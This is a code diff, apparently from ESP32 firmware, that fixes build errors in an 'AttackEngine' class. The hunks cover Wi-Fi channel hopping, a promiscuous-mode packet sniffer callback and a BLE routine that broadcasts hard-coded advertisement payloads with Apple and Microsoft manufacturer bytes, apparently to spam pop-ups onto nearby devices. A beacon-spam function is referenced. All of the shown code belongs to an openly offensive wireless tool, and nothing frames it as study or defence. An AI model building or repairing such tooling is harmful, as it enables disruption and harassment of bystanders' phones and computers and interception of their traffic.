@@ -232,7 +232,7 @@ void AttackEngine::runLoop() {
                 
                 if (millis() - lastHop > CHANNEL_HOP_DELAY) {
                     chIdx = (chIdx + 1) % 13;
-                    int nextCh = VALID_CHANNELS[chIdx]
+                    int nextCh = VALID_CHANNELS[chIdx];
                     if (nextCh >= 1 && nextCh <= 13) {
                         esp_wifi_set_channel(nextCh, WIFI_SECOND_CHAN_NONE);
                     }
@@ -302,7 +302,7 @@ void AttackEngine::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) 
             
              BaseType_t xHigherPriorityTaskWoken = pdFALSE;
              if (xQueueSendFromISR(instance->packetQueue, &msg, &xHigherPriorityTaskWoken) == pdTRUE) {
-                 portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
+                 portYIELD_FROM_ISR();
              }
         }
     }
@@ -343,10 +343,10 @@ void AttackEngine::sendBeacons(bool rickroll) {
 void AttackEngine::startBLE(int type) {
     BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData oData = BLEAdvertisementData();
-    char pSour[] = {0x02,0x01,0x06,0x1A,0xFF,0x4C,0x00,0x02,0x15,0x49,0x2E,0xFC,0x01,0x55,0x66,0x77,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; 
-    char pWin[]  = {0x02,0x01,0x06, 0x06,0xFF,0x06,0x00,0x03,0x00,0x80}; 
-    if(type == 0) oData.addData(pSour, 25);
-    else oData.addData(pWin, 10);
+    char pSour[] = {0x02,0x01,0x06,0x1A,0xFF,0x4C,0x00,0x02,0x15,0x49,0x2E,0xFC,0x01,0x55,0x66,0x77,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+    char pWin[]  = {0x02,0x01,0x06, 0x06,0xFF,0x06,0x00,0x03,0x00,0x80};
+    if(type == 0) oData.addData(std::string(pSour, 25));
+    else oData.addData(std::string(pWin, 10));
     pAdvertising->setAdvertisementData(oData);
     pAdvertising->start();
 }
